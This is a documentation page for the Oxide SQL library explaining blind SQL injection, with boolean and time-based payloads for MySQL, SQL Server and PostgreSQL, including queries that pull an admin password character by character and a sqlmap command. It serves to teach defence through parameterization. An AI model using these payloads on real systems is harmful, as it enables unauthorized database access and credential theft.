---
sidebar_position: 3
---

# Blind SQL Injection

Blind SQL injection occurs when an application is vulnerable to SQL injection
but doesn't return database output in its responses. Attackers must infer
information through indirect means.

## Boolean-Based Blind SQL Injection

Attackers craft queries that return true or false, observing changes in the
application's behavior to extract data one bit at a time.

### Detection

```sql
-- Test payloads
' AND 1=1--     (returns normal page if vulnerable)
' AND 1=2--     (returns different page if vulnerable)
```

### Data Extraction Example

```sql
-- Check if first character of admin password is 'a'
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- Check if first character ASCII value is greater than 'm' (109)
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>109--
```

By using binary search on ASCII values, attackers can extract each character
efficiently.

## Time-Based Blind SQL Injection

When boolean-based detection isn't possible (no visible difference in
responses), attackers use time delays to confirm conditions.

### MySQL

```sql
-- Basic time delay
' OR IF(1=1, SLEEP(5), 0)--

-- Conditional delay for data extraction
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',
        SLEEP(5), 0)--

-- Alternative using BENCHMARK
' OR BENCHMARK(5000000, MD5('test'))--
```

### Microsoft SQL Server

```sql
-- Basic delay
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Conditional delay
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0
   WAITFOR DELAY '0:0:5'--

-- Character extraction
'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>109)
   WAITFOR DELAY '0:0:5'--
```

### PostgreSQL

```sql
-- Basic delay
'; SELECT pg_sleep(5)--

-- Conditional delay
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Character extraction
'; SELECT CASE
   WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109)
   THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## Exploitation Challenges

Blind SQL injection is slower than in-band attacks because:

1. **Character-by-character extraction**: Data must be extracted one character
   at a time
2. **Network latency**: Time-based attacks are affected by network conditions
3. **Automation required**: Manual exploitation is impractical

## Automation Tools

Tools like SQLMap automate blind SQL injection:

```bash
# SQLMap automatically detects and exploits blind vulnerabilities
sqlmap -u "http://example.com/page?id=1" --technique=T --time-sec=5

# --technique=B for boolean-based
# --technique=T for time-based
```

## How Oxide SQL Prevents Blind SQL Injection

The same parameterization that prevents classic SQL injection also prevents
blind SQL injection. Whether the attack is visible or blind, SLEEP payloads
and boolean-based probes are treated as literal string values.

See the [builder module rustdoc](pathname:///oxide-sql/rustdoc/oxide_sql_core/builder/) for
examples.

## References

- [PortSwigger Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [OWASP Testing for Blind SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
